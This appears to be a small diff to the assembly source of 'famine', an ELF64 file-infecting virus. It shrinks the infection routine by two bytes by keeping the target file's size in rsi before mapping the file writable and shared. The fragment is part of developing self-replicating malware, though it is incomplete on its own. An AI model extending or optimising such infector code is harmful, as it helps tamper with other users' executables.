@@ -1,4 +1,4 @@
-; famine elf64 - size 726 bytes
+; famine elf64 - size 724 bytes
 
 %include "famine.inc"
 
@@ -135,16 +135,16 @@ process:                                                        ; expecting file
                 cmp         rax, 0
                 jnz         .close
 
-                mov         rax, qword [rsp - (0x148-0x30)]     ; linux st_size
-                mov         [rsp-0x50], rax                     ; rsp-0x50 = infect_fsize
-                cmp         rax, 0x1000                         ; file too small
+                mov         rsi, qword [rsp - (0x148-0x30)]     ; linux st_size
+                mov         [rsp-0x50], rsi                     ; rsp-0x50 = infect_fsize
+                cmp         rsi, 0x1000                         ; file too small
                 jl          .close
 
                 xor         r9, r9
                 mov         r8, [rsp-0x48]
                 mov         r10, MAP_SHARED
                 mov         rdx, PROT_READ | PROT_WRITE
-                mov         rsi, rax
+                                                                ; rsi is filesize
                 xor         rdi, rdi
                 mov         rax, __NR_mmap
                 syscall
